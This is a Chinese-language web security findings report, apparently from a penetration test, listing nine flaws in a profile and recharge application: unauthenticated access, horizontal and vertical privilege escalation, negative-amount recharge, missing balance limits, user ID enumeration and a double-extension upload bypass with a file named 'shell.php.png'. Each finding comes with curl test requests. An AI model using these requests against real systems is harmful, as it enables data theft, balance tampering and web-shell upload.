## 漏洞 1：无需登录访问个人中心

**URL：** `GET /profile?user_id=xxx`

**测试：**
```bash
curl "http://.../profile?user_id=admin"
```
无需携带任何会话凭证即可查看任意用户资料。

**风险：** 未认证用户可批量抓取所有用户个人信息。

---

## 漏洞 2：水平越权查看他人资料

**URL：** `GET /profile?user_id=xxx`

**测试：** admin 登录后修改 user_id 为 alice
```bash
curl -b cookies.txt "http://.../profile?user_id=alice"
```

**风险：** 任意登录用户可查看其他用户的邮箱、手机、余额。

---

## 漏洞 3：水平越权给他人充值

**URL：** `POST /recharge`

**测试：** admin 登录后修改 user_id 为 alice
```bash
curl -X POST -b cookies.txt -d "user_id=alice&amount=9999" "http://.../recharge"
```

**风险：** 任意登录用户可操作其他用户的余额。

---

## 漏洞 4：垂直越权

**测试：** 注册普通用户后查看 admin 资料
```bash
curl -b user_cookies.txt "http://.../profile?user_id=admin"
```

**风险：** 低权限用户可查看高权限用户资料，权限分级完全失效。

---

## 漏洞 5：负金额充值套现

**URL：** `POST /recharge`

**测试：**
```bash
curl -X POST -d "user_id=admin&amount=-50000" "http://.../recharge"
```

**风险：** 攻击者可通过负金额充值恶意扣减任意用户余额。

---

## 漏洞 6：余额无下限

充值负金额后余额变为负数，系统无最低余额限制，可无限透支。

---

## 漏洞 7：充值无上限

充值金额无上限限制，传入超大数值可导致金额异常。

**测试：**
```bash
amount=999999999999999
```

---

## 漏洞 8：用户 ID 可枚举

遍历 user_id 参数可探测系统中是否存在该用户。

**测试：**
```bash
curl "http://.../profile?user_id=1"   # 用户存在
curl "http://.../profile?user_id=99"  # 用户不存在
```

---

## 漏洞 9：双扩展名上传绕过

上传 `test.php.png` 可通过扩展名检查，由于仅判断最后一个扩展名。

**测试：**
```bash
curl -X POST -F "file=@shell.php.png" "http://.../upload"
```
